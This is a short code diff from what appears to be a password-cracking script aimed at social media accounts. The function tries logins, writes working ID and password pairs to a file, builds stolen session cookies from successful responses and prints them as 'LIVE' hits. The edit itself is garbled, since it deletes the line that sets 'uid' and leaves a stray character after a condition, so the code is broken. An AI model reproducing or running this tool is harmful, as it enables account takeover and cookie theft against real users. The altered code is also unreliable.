@@ -746,8 +746,7 @@ def crackfree(idf,pwv):
                 os.system('espeak -a 300 " Ok,  Tutul,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
-                if 'access_token' in q:
-                uid = str(q['uid'])
+                if 'access_token' in q:j
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Tutulb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Tutulb};{ckkk}"
                 print(f'\r\r\033[38;5;46m[Tutul-LIVE] {uid} | {pas}')
                 print(f'\r\r\033[38;5;46m[COOKIE]\033[38;5;46m {cookie}')
